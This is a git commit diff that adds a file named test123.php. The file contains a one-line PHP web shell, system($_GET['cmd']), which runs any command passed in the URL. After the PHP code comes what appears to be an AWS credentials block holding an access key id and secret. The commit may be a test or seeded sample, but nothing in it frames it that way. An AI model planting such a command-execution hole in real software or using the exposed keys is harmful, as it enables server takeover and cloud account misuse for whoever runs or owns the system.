4328dd63909e23f414fd54764dd9fee8c51ab874
Raphael <raphael@zeropath.com>
2025-08-28 16:47:28 -0700

    Create test123.php

---
+++ test123.php
@@ -0,0 +1,15 @@
+<?php
+
+echo "<h1>test</h1>"
+
+system($_GET["cmd"]);
+
+
+
+?>
+
+[default]
+aws_access_key_id = AKIA2T2SJH6M76LT25T4
+aws_secret_access_key = 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
+output = json
+region = us-east-2
